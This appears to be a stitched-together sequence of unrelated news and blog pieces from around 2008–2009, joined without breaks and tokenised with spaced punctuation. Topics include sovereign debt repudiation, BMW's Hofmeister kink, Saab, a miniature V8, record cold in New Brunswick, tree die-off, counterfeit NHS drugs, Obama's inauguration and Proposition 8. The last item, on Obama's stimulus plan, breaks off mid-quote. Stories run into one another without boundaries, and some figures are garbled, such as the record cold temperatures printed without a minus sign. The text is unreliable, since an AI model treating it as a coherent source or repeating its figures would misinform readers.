But while lots of people make that claim , either tacitly or explicitly , hardly anyone makes any real effort to defend it .
And in fact , given both what we know about governments in general , and in particular about the kind of governments that tend to rule countries like Ecuador , it ’s a claim that happens to be ridiculously implausible .
As a matter of fact , permanently crippling governments ’ ability to raise funds for costly government projects is one of the best developments I could hope for on the world scene .
When Progressive outfits like Make Poverty History have noticed the problems that government debts create , their response has been , mainly , to beg rich governments to cancel the existing debts of poor governments , as a sort of charitable hand - out to the poor dears , preferably through a process mediated by some international bureaucracy , probably under the control of the U.N .
The whole proposal is absurd ; the main consolation is that , like most other grand Progressive proposals , it is more or less completely ineffectual .
( Who do you think has more influence over the U.S. government ’s trade and international finance bureaucracies ?
Bono or the IMF and CitiGroup ? )
In fact , discussions of government debt should not focus on mediated settlements or relief from creditor governments , but rather on unilateral repudiation of so - called public debt by debtor governments .
Not because enforcing the collection of these debts is scroogish or because it ought to be tempered by considerations of charity , but rather because the debts themselves are completely illegitimate and enforcing the collection of these debts is absolutely unjust .
Whether that ’s the debts of the governments in Ecuador , or in Tanzania , or , for that matter , in the United States of America — where we are all being extorted to pay off US $ 10,000,000,000,000 of debts that we never once agreed to .
Debts that were taken out without our permission , then inflicted on us against our will , so that this government could pay for its murderous wars , its tyrannical surveillance and intelligence apparatus , its brain - dead federal programs , its byzantine busybodying regulation , and its multitrillion dollar preservation programs for endangered capitalists and their habitats in the economic status quo .
So here ’s to repudiation ; and here ’s hoping for two , three , many Ecuadors … .
Sometimes the smallest things can make the biggest differences .
They can carry powerful associations that are n't immediately obvious .
Some good examples are :
The idea that a detail can make a big difference has always been fascinating to me .
I 've also always been really fascinated by cars and automotive design .
So a few months ago when I saw that Jalopnik named " The Hofmeister Kink " the number one design element of all time I was interested .
I had never heard of it before and I could n't see how it could make much of a difference at all in the overall design of a car .
Below is my attempt to figure out what this detail is and how it can make a difference .
What is the Hofmeister Kink ?
The Hofmeister kink is a small design feature of BMWs .
It is the name for the small cutout of the rear side windows on the C - pillar of the car .
Rather than having the rear side window extend all the way down as might be expected , it angles back toward the front of the car .
It is named after the legendary Director of Design at BMW , Wilhelm Hofmeister .
It first appeared on the 1961 BMW 1500 .
You can see this on the 1500 in the image below .
( Circled in blue )
The Hofmeister kink has become a signature design element of all BMWs .
BMW claims that it " subtly highlights " that the cars are rear - wheel drive .
Since it first appeared , the kink has appeared on every BMW manufactured .
Below is the C - Pillar of all of the BMW " Compact Exec " type cars since the 1500 .
( The modern model is the 3 - Series )
During that time BMW has become synonomous with quality ; the 3 - Series is a legend and has been named to the Car and Driver Ten Best list every year since 1992 .
As expected , the Hofmeister kink is now appearing on all kinds of cars .
My hypothesis was that it would appear most on cars that were meant to seem luxurious , or high - end .
Naturally , it would n't appear on a Mercedes , being rivals with BMW and I would be surprised to see it on any car or make with a strong design history .
How Manufacturers Use the Kink to Distinguish Marques
Auto manufacturers typically have more than one marque of car so that they can target both luxury car buyers as well as more value - minded consumers .
A manufacturer often competes with itself , offering similar cars across marques that differ primarily in levels of luxury .
Some examples of differet lines from different manufacturers are :
Ford - Mercury / Lincoln
Chevy - Oldsmobile - Buick - Cadillac
Honda - Acura
Toyota - Lexus
Nissan - Infinity
I 've noticed that many of these brands has been the use of the Hofmeister Kink to distinguish between similar models of different marques .
Below are some examples :
There are many other examples ( and a couple counter - examples ) but the trend is clear , particularly when looking at cars made after the mid 1990s .
Some notable exceptions are :
Mercedes -
As mentioned above they are unlikey to use a signature design feature from BMW .
Cadillac -
They currently have a very strong design language of their own .
Honda / Acura - The Accord and its Acura equivalents all have the Kink
Nissan / Infiniti -
All of their cars have the kink ( not true a decade ago )
Korean Manufacturers
Try to Move Upmarket
The Korean auto manufacturers , Hyundai and Kia are seemingly trying to duplicate the path to success that Honda used .
Start with cheap economy cars , earn a reputation for quality and move upmarket into more expensive luxury models .
In the last couple of years , both Hyundai and Kia have introduced more luxurious sedans and SUVs .
While the Kia Amanti has clearly taken heavy design inspiration from Mercedes ( no kink ! ) , its Optima sedan is more in line with other manufacturers .
Below are two examples :
Conclusion
This seemingly inconsequential detail has developed into a key theme of automotive design .
It is clear that automotive designers work within a set of guidelines they understand well , knowing how the details impact public perception .
This aspect of design is certainly not only relegated to cars , but is carried through other design mediums as well .
Web design is no exception .
There are features of a site that can be used to instantly exude professionalism and sophistication .
I wanted to take this time to turn it over to the readers and get your thoughts on your favorite subtle design techniques , only noticeable to a very discerning eye , that instantly convey a level of beauty to the site 's visitors .
What elements come to mind ?
General Motors wants more help from the Swedish government for Saab The board of the Swedish carmaker Saab , which is owned by General Motors , has held an extraordinary board meeting to consider its future .
Local media reports have suggested Saab was considering taking measures to seek protection from creditors .
There have been doubts about the future of Saab since the Swedish government rebuffed GM 's call for financial aid for the car maker .
It was later reported that the meeting had been adjourned .
Micael Lindell , a union representative at Saab , said the board meeting had broken up and would reconvene at some point , but could not say when this would happen .
Saab itself has refused to confirm that the meeting took place .
' Cash demands ' GM plans to make Saab an independent business by the start of 2010 .
The reorganisation process is the Swedish equivalent of going into Chapter 11 bankruptcy in the US , which gives a business the chance to restructure its debts and retain control of its operations , without creditors pursuing the firm .
The company applies to the district court for a reorganisation ruling .
If it is granted , an administrator is appointed , but the current management continues to run the company .
The administrator helps negotiations with the company 's creditors to decide how much of their money they will receive .
The reorganisation lasts three months and may be renewed by the court , up to a maximum of one year .
During that period , the company is not allowed to pay off any debts that were accumulated before the reorganisation was declared .
GM has been looking for a buyer for Saab , and said on Wednesday " given the urgency of stemming sizeable cash demands associated with Saab operations " it would need support from the Swedish government prior to any sale .
But the country 's Enterprise and Energy Minister Maud Olofsson told Swedish public radio that " voters picked me because they wanted nursery schools , police and nurses , and not to buy loss - making car factories " .

Constructing tiny replica or modified versions of full - scale engines is a little - known hobby with a rabid fan - base .
It boasts adherents to the art of building tiny steam engines , radial engines , all manner of V - engines , single cylinder motors , vintage agricultural engines , and experimentals , along with what we see here , compressed air powered miniatures .
Compressed air engines are sort of the marijuana of miniature engines , just hardcore enough to keep the sissies out , but sort of a gateway project , leading to crazier and crazier builds with honest to goodness miniature internal combustion with all the implied complexity .

This example is one of the smallest examples of a V8 we 've ever seen and it was built to emulate the Chevy 350 in look if not in function .
The video shows the motor in an early , undecorated iteration running on 65 PSI of compressed air for a sustained 38 seconds .
It may bot be internal combustion , but take a look at the impossibly small components and you can appreciate the build anyway .
Check out the hand built and pressed together crankshaft , the tiny connecting rods and pistons , it 's all very impressive .
Until you look at Steve 's next project — a cast V4 engine called PeeWee with real - deal internal combustion and a functioning coolant circulation system .

New Brunswickers woke up to one chilly morning as the province experienced frigid temperatures that set records Friday morning .
A d v e r t i s e m e n t
Claude Cote , a meteorologist with Environment Canada , said communities across the province broke some long standing weather records .
The mercury dropped to 34.3 C in Fredericton Friday morning , which broke a record that was set in 1884 .
“ We did set some record cold temperatures in many communities including in Saint John and Moncton as well , but Fredericton was actually one of the oldest ones , ” Cote told CBC News on Friday .
However , the coldest ever recorded in January for the province still remained .
That record was set in 1925 when the temperatures dropped to 46.7 C in Chipman , N.B .
Cote said the arctic dome of air over the Maritime provinces was over the Prairies earlier this week .
He said the temperatures were relatively mild in comparison to what the Prairies experienced .

Ecologists have seen a sharp increase in the number of trees dying
Old growth trees in western parts of the US are probably being killed as a result of regional changes to the climate , a study has suggested .
Analysis of undisturbed forests showed that the trees ' mortality rate had doubled since 1955 , researchers said .
They warned that the loss of old growth trees could have implications for the areas ' ecology and for the amount of carbon that the forests could store .
The findings have been published in the journal Science .
" Data from unmanaged old forests in the western US showed that background mortality rates have increased rapidly in recent decades , " the team of US and Canadian scientists wrote .
" Because mortality increased in small trees , the overall increase in mortality rates cannot be attributed to ageing of large trees , " they added .
" Regional warming and consequent increases in water deficits are likely contributors to the increase in tree mortality rates . "
Water woes
After ruling out a variety of other possible factors , including insect attacks and air pollution , the researchers concluded that regional warming was the dominant contributor .
Scientists fear the die - back could be a signal of worse to come " From the 1970s to 2006 , the mean annual temperature of the western US increased at a rate of 0.3C to 0.4C per decade , even approached 0.5 C , " they observed .
" This regional warming has contributed to widespread hydrological changes , such as declining fraction of precipitation falling as snow , declining snowpack water content , earlier spring snowmelt and a consequent lengthening of summer drought . "
The team , led by the US Geological Survey ( USGS ) , examined data from 76 temperate forest stands older than 200 years , which contained almost 59,000 trees .
Over the study period , which stretched back to 1955 , more than 11,000 trees died .
The researchers reported that the increased mortality rate affected a range of species , different sized trees , and all elevations .
" The same way that in any group of people , a small number will die each year ; in any forest , a small number of trees will die , " explained co-author Phil van Mantgem , a USGS ecologist .
" But our long - term monitoring shows that tree mortality has been climbing , while the establishment of replacement trees has not . "
Carbon store
The change in the forests ' dynamics , the team noted , was going to have an impact on the forests ' ecology and carbon storage capabilities .
" We may only be talking about an annual tree mortality rate changing from 1 % a year to 2 % , but over time a lot of small numbers add up , " said co-author Professor Mark Harmon from Oregon State University .
He feared that the die - back was the first sign of a " feedback loop " developing .
As regional warming caused an increased number of trees to die , there would be less living trees to absorb carbon dioxide from the atmosphere .
Yet there would be an increased proportion of decaying trees , releasing the carbon that had been locked away inside the trees ' wood .
Warmer temperatures might also increase the number and prevalence of insects and diseases that attack trees , the team added .
They used the example of recent outbreaks of tree - killing bark beetles in the US , which have been linked to a rise in temperatures .
Another member of the team , Dr Nate Stephenson , said increasing tree deaths could indicate a forest that was vulnerable to sudden , widespread die - back .
" That may be our biggest concern , " he warned .
" Is the trend we 're seeing a prelude to bigger , more abrupt changes to our forests . "

Counterfeiting gangs based in China are producing sophisticated copies of the world 's bestselling pharmaceuticals .
In 2008 an estimated 8 m of these potentially deadly pills found their way to NHS patients .
The health of millions of people is at risk
They were made in China , labelled in French and then shipped to Singapore .
They ended up in Liverpool and from there were sold straight into the heart of the NHS .
As the criminal investigation continues into how a fake consignment of Zyprexa , an anti-psychotic treatment prescribed for schizophrenia , infiltrated Britain 's healthcare system last year , evidence is mounting that sophisticated counterfeiting syndicates are increasingly targeting Britain 's network of high - street chemists , hospitals and GP surgeries .
Figures collated for the first time reveal that British border officials seized more than half a million counterfeit pills destined for the NHS and high - street chemists last year , an amount equal to the quantity of counterfeit drugs found in the whole of Europe in 2005 .
So vast is the scale of the threat from fake medicines that public confidence in the NHS could be " completely undermined " , according to legal experts .
Health officials also warn that the health of millions of Britons is potentially at risk .
More than £ 3 m of fake life - saving medicines for ailments such as heart disease and cancer were intercepted by customs officials and the Home Office border agency in the first 10 months of 2008 .
Three consignments were each larger than 100,000 pills .
In response , customs has upgraded tackling the trade in fake medicines to " high priority " , the same urgency devoted to targeting heroin and cocaine dealers .
Interpol recently revealed it was investigating reports that profits from counterfeit drugs are funding terrorist groups , including al - Qaida .
Others warn that smuggling counterfeit drugs into Britain 's healthcare network could prove to be a terrorist weapon in itself .
Latest government intelligence indicates that criminal gangs operating largely out of China have shifted away from selling fake " lifestyle " drugs such as Viagra on the internet and are now concentrating on supplying counterfeit " life - saving " medicines to the NHS .
Profits are potentially greater , with the high price of medicines in the UK ensuring that it has emerged as a prime target for criminals , according to the government agency that oversees the safety of medicines , the Medicines and Healthcare Products Regulatory Agency .
Mick Deats , a former Scotland Yard detective chief superintendent who heads the agency 's intelligence and enforcement unit , said : " Criminals are branching out and we are seeing counterfeit drugs that treat prostate cancer , for example , moving into the healthcare system . "
Covert monitoring of email traffic , " computer forensics " and telephone calls pinpoint China as the principal hub for the manufacture of Britain 's counterfeit medicines .
The Observer has learned that Chinese police authorities recently travelled to London to discuss the growing problem .
Deats said all available evidence confirmed a sharp growth in the trade of counterfeit drugs .
Major recalls of fake medicines have been ordered by the agency on 14 occasions in the last three years , compared with just one in the previous decade .
In addition , four criminal investigations are proceeding into fake treatments found within the official healthcare supply chain .
Among them are the consignment of Zyprexa , 40,000 doses of Casodex , a hormone treatment for men with advanced prostate cancer , and Plavix , a blood thinner .
Yet the British authorities admit it is impossible to calculate the quantity of fake medicines entering the UK or their potential health impact .
Graham Satchwell , the former head of Scotland Yard 's organised crime group , who has spent years investigating the counterfeit drugs trade , believes significant numbers of Britons may already have died as a result of fake medicines .
Although no deaths from counterfeit drugs have been recorded , Satchwell said the very nature of fake medicines meant patients may have died without counterfeit drugs being blamed .
" They may have less of the active ingredient , meaning people could die because they are not receiving their life - saving treatment .
Even now , though , healthcare professionals never assume it is the drug .
No one asks whether deaths are attributable to fake medicines , " said Satchwell .
However , forensic examinations of fake treatments have revealed toxic impurities such as anti-freeze and tiny amounts of the active ingredient , if there are any at all .
The size of the problem facing the NHS is now so great that Interpol 's secretary - general , Ronald Noble , opened an anti-counterfeiting conference in Africa recently by admitting to being " shocked " at discovering that fake drugs were more deadly than terrorism .
Forty years of terrorism , he said , had killed 65,000 people , compared with 200,000 in one year alone in China from counterfeit medicines .
At what is described as the largest trade fair in the world , thousands of foreign buyers flock to southern China twice a year to order the country 's latest exports .
Now Canton Fair , Guangzhou , has come to the attention of the British police , following claims that criminal gangs are placing huge orders for counterfeit drugs destined for the UK .
Thousands of firms are currently engaged in China 's new growth business .
Experts admit they cannot always spot fake drugs in packaging made using state - of - the - art printing and blisterfoil machines .
Recently the manufacturers of an anti-malarial drug added a hologram to its blisterfoil to beat the fakers .
Within a month , criminals had successfully replicated their efforts .
From China , the fake medicines head west , typically passing through the transit point of Dubai , then the porous borders of Europe .
Here the route becomes increasingly opaque .
Intelligence reports from the medicines agency show that a single consignment of drugs can change hands up to 30 times before it reaches a British high - street chemist .
With frequent repackaging taking place , detection of fake goods is notoriously difficult , with police admitting that odds are weighted in the criminals ' favour .
Research last month confirmed that just 0.1 % of goods entering the UK are physically inspected by customs officers , suggesting the 500,000 intercepted in 2008 is likely to be a fraction of the true picture .
The National Audit Office believes that the UK is one of the easiest places in the EU to smuggle counterfeit goods , due to a lack of checks .
Once within the UK , drugs are distributed via Britain 's network of pharmaceutical wholesalers .
Satchwell said that cash - conscious NHS trusts were encouraged to buy drugs as cheaply as possible .
Satchwell , a former director of security at GlaxoSmithKline , added : " There are hundreds of dealers , and they are selling drugs as legitimate and genuine materials .
Once it has been sold to the dealer , it can go anywhere in the NHS . "
Even double - checking batch numbers is no defence , with medicines agency investigations revealing that details of legitimate batch numbers have been copied in China 's counterfeiting factories .
Deats said NHS trusts should avoid deals that looked too good to be true .
" The message is that if you are offered medicines from an unusual source at an unusual price from an unusual country , chances are there is something wrong with them , " he said .
British investigators have found Casodex , whose wholesale price is £ 128 for a pack of 28 pills , being offered by Chinese gangs for less than £ 5 .
John Newton , intellectual property rights manager for Interpol , said : " Criminals use existing supply chains .
It 's very hard to detect . "
Interpol 's latest profiling describes the modern organised criminal as " like a commodities broker " rather than the stereotyped shadowy underworld figure .
A shipment that successfully penetrates the UK supply chain can lead to profits in excess of £ 1m .
" They can make four times the money and only risk a fine .
Penalties do n't reflect the nature of a crime that can kill people , " said Gary Noon , chief executive of Aegate , a British firm that has introduced a bar code to determine whether a pharmaceutical is authentic .
Of the fake batches known to have infiltrated Britain 's healthcare system , some include the cholesterol - reducing treatment Lipitor .
Three years ago 2,523 packs of fake Lipitor were sold in Britain .
Details obtained under the Freedom of Information
Act reveal that only 359 of those packs were ever recovered .
The nightmare scenario is that a batch containing lethal substances will one day penetrate the NHS .
Last year EU customs officers intercepted counterfeit drugs containing brick dust with yellow paint and furniture polish .
In the developing world , mass casualties are already frequent .
More than 13,000 children in China were treated following release of a tainted batch of infant milk formula , while scores of youngsters died in Haiti after swallowing paracetamol cough syrup containing toxic diethylene glycol .
Yet quantifying the threat to Britain remains impossible , according to the medicines agency .
The World Health Organisation estimates that up to 1 % of prescriptions in the developed world a year are fake , equating to around 8 m in Britain .
Deats believes the true UK figure is significant - in the millions - but potentially smaller .
Yet the growth in trade is increasingly a concern .
Hundreds of counterfeit factories have been shut down in China , yet the output of fake drugs has grown .
Noble recently cited research that global counterfeit drugs sales will rise to more than $ 75bn by 2010 , a 90 % increase in five years .
The United Nations drug control board believes trafficking and abuse of prescription drugs has overtaken the use of all illegal narcotics except cannabis .
In the short term , the European commission is considering introducing new rules , such as banning the repackaging of medicines and the mandatory use of special seals to stop counterfeiters .
In addition , companies such as Aegate have opened discussions with the NHS over the implementation of their bar codes to determine whether a drug is genuine , following successful trials in Europe .
But as long as criminals can harvest enormous profits , British patients will remain vulnerable .
" The counterfeiters target the weakest members of our societies - the young , the sick , the economically disadvantaged , and it is our obligation to take action , " said Noble .
Get ready for the geek - in - chief .
President - elect Barack Obama used to collect comic books , can't part with his BlackBerry , and once flashed Leonard " Mr. Spock " Nimoy the Vulcan " Live Long and Prosper " sign .
That and other evidence has convinced some of Obama 's nerdier fans that he 'll be the first American president to show distinct signs of geekiness .
And that 's got them as excited as a Tribble around a Klingon .
Download the new Independent Premium app Sharing the full story , not just the headlines
Obama is good at " repressing his inner geek , but you can tell it 's there , " especially when he goes into nuanced explanations of technical matters , said Benjamin Nugent , author of the book American Nerd : The Story of My People .
" One imagines a terrifying rally of ' Star Trek ' people shouting , ' One of us ! ' "
Nugent said , in an interview conducted by email , of course .
Others see only some geek qualities , qualifying the president - elect as merely " nerd- adjacent . "
After all , he 's an athlete and kind of cool , some experts demur .
Still , there 's enough there for geeks to celebrate .
Psychology professor Larry Welkowitz of Keene State College in New Hampshire hopefully speculated that there 's a shift in what 's cool and that " smart can be in .
Maybe that started with the computer programmers of the '90s .
The Bill Gates of the world are OK . "
The Obama transition team would not comment on the president - elect 's geek qualities , even when it was suggested those could be positive .
And his old college friends give the geek idea a split vote .
While Margot Mifflin , now a journalism professor in New York , said she saw no geeky signs in Obama as a freshman at Occidental College in California , Amiekoleh Kimbrew Usafi recalled it differently , despite the lack of technology back in 1979 .
" He 's a geek because he was smart , " Usafi said , noting that Occidental was a geeky school to start with , billing itself as the Yale of the West .
" I remember he would be hitting his books .
I would see him in the library .
...
There were a lot of girls that liked him because he was cute , but he kept his head in the direction he was going in .
I would see him studying all the time . "
Wired magazine first crowed about Obama the geek , complete with five reasons in its GeekDad blog .
A lot depends on definition of geek , which to Wired is more a compliment than insult .
GeekDad contributor Matt Blum , a software engineer in Reston , Virginia , defines geeks as having high intellects , embracing technology , " getting excited about things in the future especially , particularly fiction , " having a science viewpoint and being steeped in the geek culture of science fiction and fantasy .
Geeks know and use references from Star Trek , " Dungeons and Dragons " and comic books .
And , he added , they are nit-picky , unafraid to correct mixed science fiction metaphors , such as confusing Star Trek 's Andorians with Star Wars ' Iridonians .
So a quick geek cultural check for Obama :
Technology : Click that icon .
He 's the candidate who tried to announce his vice presidential pick by text message and embraced Facebook as a campaign tool .
He 's seldom seen without a BlackBerry and talks of a chief technology officer for the nation .
Comic books :
As a youngster , Obama collected Spider - Man and Conan the Barbarian comic books .
His Senate website used to have a photo of him posing in front of a Superman statue , and in October at New York 's Alfred Smith dinner he joked : " I was actually born on Krypton and sent here by my father Jor - El to save the planet Earth . "
Jor-El was the father of Superman , born on the planet Krypton .
Star Trek , the long - running TV show : According to the actor Leonard Nimoy , who played Mr. Spock in the series , Obama flashed him the split four - fingered Vulcan salute when the two crossed paths last year .
In May in Des Moines , Newsweek caught Obama teasing wife Michelle about her belt buckle , saying it was studded with Star Trek - powering dilithium crystals and adding , " Beam me up , Scotty ! "
As he laughed at his own joke , Michelle Obama rolled her eyes , as geek wives often do .
Yes , geeks have wives .
That 's one of the things that separates them from nerds and dorks .
" A geek is someone who has the knowledge of the geeky type stuff and has social graces , " Blum said .
" A nerd is someone who has the knowledge but not the social graces and a dork is someone who has neither . "
By that definition Obama is a geek , not a nerd or dork , Blum said .
Nerds are the type who live in their parents ' basements until they 're 45 , whereas geeks are more normal , he said .
" I'm a geek because I 'm a dad , " Blum said .
" I managed to find a woman who wished to marry me and have children with me . "
Blum said Obama qualifies as the first geek - in - chief because George W. Bush was too much a cheerleader and Bill Clinton too wonky and not technological enough .
The other presidents came of age before geek culture did , so do n't qualify .
But do n't discount John Quincy Adams as a geeky guy who steeped himself in government as a teenager , contends author Nugent ( who just by adding that historical reference reinforces his geek expertise ) .
In some ways , though , experts say Obama is just too cool , too athletic , too normal to wear the geek cape .
Obama did use drugs and was a high school athlete , missing out on two prime nerd qualities , Nugent said .
Dan Sarewitz , a professor of science and society at Arizona State University , said calling Obama a geek is unfair both to the president - elect and geeks .
" He 's too cool to be a geek ; he 's a decent basketball player ; he knows how to dance ; he dresses well , " Sarewitz said .
" It 's too high a standard for geeks to possibly live up to . "
All the nerds at home can at least try , though , courtesy of a heavily muscled " beach blanket Obama " action figure for $ 29.95 .
So is Obama a geek ?
In the words of Alan Leshner , president of the American Association for the Advancement of Science , which had two past leaders appointed by Obama to high posts : " I hope so . "
Experts say Obama should retake the oath THE INAUGURATION OF BARACK OBAMA
Just to be constitutionally correct , experts say , Obama should retake oath misadministered by the chief justice
Barack Obama 's hand lies on a bible as he is sworn in as the 44th US president by Supreme Court Chief Justice John Roberts in front of the Capitol in Washington on January 20 , 2009 .

Several constitutional lawyers said President Obama should , just to be safe , retake the oath of office that was flubbed by Chief Justice John Roberts .
The 35 - word oath is explicitly prescribed in the Constitution , Article II , Section 1 , which begins by saying the president " shall " take the oath " before he enter on the execution of his office . "
The oath reads : " I do solemnly swear that I will faithfully execute the office of president of the United States and will to the best of my ability , preserve , protect and defend the Constitution of the United States . "
In giving the oath , Roberts misplaced the word " faithfully , " at which point Obama paused quizzically .
Roberts then corrected himself , but Obama repeated the words as Roberts initially said them .
A do - over " would take him 30 seconds , he can do it in private , it 's not a big deal , and he ought to do it just to be safe , " said Boston University constitutional scholar and Supreme Court watcher Jack Beermann .
" It 's an open question whether he 's president until he takes the proper oath . "
The courts would probably never hear a challenge , and some might argue that Obama automatically took office at noon because that 's when President Bush left the office .
But because the procedure is so explicitly prescribed in the Constitution , Beermann said if he were Obama 's lawyer , he would recommend retaking it , just as two previous presidents , Calvin Coolidge and Chester Arthur , did under similar circumstances .
" The Constitution says what he 's supposed to say , " Beermann said . " ...
It 's kind of surprising the chief justice could n't get it right . "
The only reason not to retake the oath would be to prevent further embarrassment of the chief justice , he said .
" It would seem appropriate for the president of the United States to take the oath specified in the Constitution , " he said .
" It 's the same oath all 43 of his predecessors took .
He ought to take it . "
Charles Cooper , head of the Justice Department 's Office of Legal Counsel under President Ronald Reagan , said that the oath is mandatory , that an incorrect recitation should be fixed and that he would be surprised if the oath had n't already been re-administered .
Jonathan Turley , a constitutional law professor at George Washington University , was hosting an inauguration party at his home in McLean , Va. , Tuesday and did a mock swearing - in of 35 children .
When Roberts erred , one child shouted : " That 's not right ! "
" He should probably go ahead and take the oath again , " Turley said .
" If he does n't , there are going to be people who for the next four years are going to argue that he did n't meet the constitutional standard .
I do n't think it 's necessary , and it's not a constitutional crisis .
This is the chief justice 's version of a wardrobe malfunction . "

Two Gods ?
They can't be mutually exclusive .
More than 300 supporters of Proposition 8 , the ballot measure that would take away the right of same - sex couples to wed , rally at the Capitol in Sacramento , Calif. , Tuesday , Oct. 28 , 2008 .
Same - sex marriage issue on back burner
Same - sex marriage , a hot issue in the 2004 campaign , has been but a blip on the national political scene in 2008 despite a new round of state ballot measures to ban it .
The country ’s economic woes have eclipsed social issues among voters , and neither John McCain nor Barack Obama has tended to raise such charged social issues .
Four years ago , a CNN exit poll found that 22 percent of voters made their choice based on “ moral values , ” outranking the economy and terrorism .
Eighty percent of “ values voters ” that year cast their ballot for President Bush , versus just 18 percent for Sen .
John Kerry , according to exit polls .

But a recent CBS / New York Times poll of 1,234 likely voters found far fewer voters basing their vote on values this year , with more than half listing the economy as their top concern , followed by terrorism , health care , energy , the Iraq war and illegal immigration .
“ Values ” were among the “ other ” issues that were the chief concern of just 6 percent of voters .
On Tuesday , voters in California , Arizona and Florida will decide whether to approve constitutional bans on gay marriage .
In California , a state Supreme Court decision granting the right for gay and lesbian couples to wed laid the groundwork for a massive statewide campaign against it that some gay marriage opponents are calling the “ Super Bowl ” of the issue .
Polls are tightening — a Field Poll released Friday showed 49 percent to 44 percent against the measure — but analysts say it ’s too close to call .
“ It ’s anybody ’s guess how this turns out , ” said John J. Pitney Jr. , a political science professor at California ’s Claremont McKenna College .
While California 's Proposition 8 has been the most expensive state ballot measure this cycle , it ’s yet to attract much national attention .
“ If California votes overwhelmingly in favor of traditional marriage that ’ll be very interesting because you ’d have a liberal state saying no to Steve and Bill getting married , ” said Tim Wildmon , president of the American Family Association , which has thrown $ 500,000 behind the proposition .
In Arizona and Florida , the issue of same - sex marriage has yet to really resonate as several tight campaigns are grabbing headlines in both states .
Bruce Merrill , an Arizona pollster who runs the Arizona State University / KAET poll , said the state ’s measure “ has not gotten much attention . ”
“ Like in other places the economy has taken the steam out this issue , ” Merrill said .
In 2006 , Arizona became the only state so far to reject a constitutional ban on gay marriage .
That initiative , though , also included language barring gay couples from rights granted in civil unions such as insurance benefits and hospital visitation .
The current measure , which includes no such stipulations , is supported by 49 percent of Arizonans , while 42 percent say they will vote against it , according to the most recent Merrill poll of 976 registered voters .
In Florida a recent poll of 625 likely voters conducted by Mason - Dixon showed that voters favor the ban 56 - 37 percent , which would be short of the 60 percent majority needed in the state for voters to pass a ballot measure .
Some have pointed to the issue as responsible for driving up turnout among both social conservatives and liberals in 2004 .
This year , polls suggest that is unlikely to happen .
Both Pitney and Merrill doubt the issue will have much impact on other elections .
A huge Democratic turnout for Obama in the three states , however , may determine the fate of the closely contested measures .
While a constitutional ban on gay marriage is widely opposed in most Democratic circles , a large turnout among Hispanics , whose Catholic faith stands against the issue , could give the ballot measures a boost .
Neither Obama nor McCain has been eager to debate highly charged social issues , and gay marriage has been tricky for both .
Obama does not support gay marriage , but opposes Proposition 8 and would not support a federal constitutional ban .
Some have speculated that the Illinois Democrat does in fact favor granting same - sex couples the right to marry , pointing to his liberal social views and strong opposition to laws restricting the rights of any segment of the population .
Obama has told supporters his view on the issue stems from his Christian faith , though has said he is “ open to the possibility ” that he may be wrong on the issue .
McCain , meanwhile , splits with both his running mate and the conservative base on the issue in also standing against a constitutional ban .
The Arizona Republican was one of the few members of his party to stand with Democrats in the Senate in opposition to federal ban on gay marriage , citing his strongly held belief that the issue should be decided by individual states .
“ There is no point for either of them to bring this up , ” Pitney said .
“ California is not in play and neither candidate wants to dwell on the issue . ”
Wildmon said that he and other social conservatives wish McCain would campaign on the issue but that he recognizes it does n’t exactly play to McCain ’s strengths .
“ He was n’t in favor of a federal marriage amendment , so that sort of neuters him from talking about this , ” Wildmon said .
“ He seems to be uncomfortable talking about moral issues . ”
“ Palin seems plenty comfortable talking about it .
She ’s not bashful .
I ’d turn her loose , but she ’s not the top of the ticket , and McCain has to answer for everything she says , ” he added .

The UK is the cocaine , ecstasy and amphetamine capital of Europe , according to a report into the state of the drugs problem .
A report by the European Monitoring Centre for Drugs and Drug Addiction ( EMCDDA ) shows that , for the fifth year running , the UK has recorded the highest number of cocaine users in the EU .
The annual figures show that 7.7 per cent of Britons aged 15 - 64 have taken cocaine - rising to 11.2 per cent for the 15 - 24 age group and 12.7 per cent for the those aged between 15 and 34 .

In each category Spain is second ( 7 per cent , 8.7 per cent and 9.6 per cent respectively ) and Ireland fourth ( 5.3 per cent , 7 per cent and 8.2 per cent ) .
The UK is also top of the league table for ecstasy , with 7.3 per cent of 15 to 64 - year - olds admitting taking the drug in their lifetime , while amphetamines have been tried by 11.9 per cent of Britons .
Shadow Home Secretary Dominic Grieve said : " This report confirms Britain 's status as the cocaine capital of Europe , not to mention the fact we also have the highest prevalence of amphetamine and ecstasy use amongst adults .
" It is particularly disturbing that we have the highest proportion of fifteen and sixteen - year - olds using cocaine - the Government 's failure is betraying a whole generation of young people .
" This is due to Labour 's chaotic , confused and staggeringly complacent approach to drugs .
Drugs wreck lives , destroy communities and fuel crime - the fact Labour do not recognise this make them part of the problem , not the solution . "
The survey said that 12 million EU citizens aged 15 - 64 admitted to having taken cocaine at some time in their lives , while 11 million have used amphetamines and 9.5 million have used ecstasy .
Cannabis use is much higher : 71 million Europeans say they have tried it - about one in four citizens .

In the UK 30.1 per cent of the 15 - 64 age group say they have used cannabis , exceeded only by France ( 30.6 per cent ) and Denmark ( 36.5 per cent ) .
Among 15 - 34 year - olds the rate is higher - 41.4 per cent in the UK compared with 43 per cent in France and 49.5 per cent in Denmark .
The report said : " Prevalence of ( ecstasy ) use has remained consistently higher in the United Kingdom compared to the other countries .
" Data from a few countries suggest that cocaine could be replacing amphetamines and ecstasy among some sectors of the drug - using population .
This may be the case in the UK and Denmark , and to some extent in Spain .
Both the UK and Denmark report relatively high lifetime prevalence estimates for the use of amphetamines at 11.9 per cent and 6.9 per cent respectively , but levels of reported use in the last year and last month are more in line with those found in other countries .
" Increases in cocaine consumption in these countries have been matched to some extent by a decrease in the use of amphetamines , raising the possibility that one stimulant drug is replacing another in these markets . "
The study also found a growing trend of " online shops " selling drugs over the internet , with more than half ( 52 per cent ) based in the UK .
More than 200 different psychoactive substances offering " legal highs " were available , researchers said .
The Home Office welcomed the report 's conclusion that drug use in the UK is stabilising , with numbers using cannabis and heroin falling :
A Home Office spokesman said : " Home Office figures published last week show overall drug use in the UK is at an all time low and the number of seizures is up 15 per cent on the last annual statistics .
" Alongside this , new figures today show the number of problem drug users has remained stable .
" We continue to focus our efforts on reducing the harm caused by illegal drugs through tough enforcement , education and treatment .
" We are already taking action to combat cocaine use ; the drug information campaign FRANK will soon launch a £ 1 million campaign to educate the public about the social and health costs associated with the drug . "
Obama ’s stimulus plan :
Another windfall for big business
9 January 2009
In his first major policy speech since winning the presidential election , Barack Obama on Thursday pushed for speedy passage of his economic stimulus plan , painting a dire picture of the consequences should it fail to be rapidly implemented .
“ We start 2009 in the midst of a crisis unlike any we have seen in our lifetime , ” he declared , “ a crisis that has only deepened over the last few weeks … .
Now , I do n’t believe it ’s too late to change course , but it will be if we do n’t take dramatic action as soon as possible .
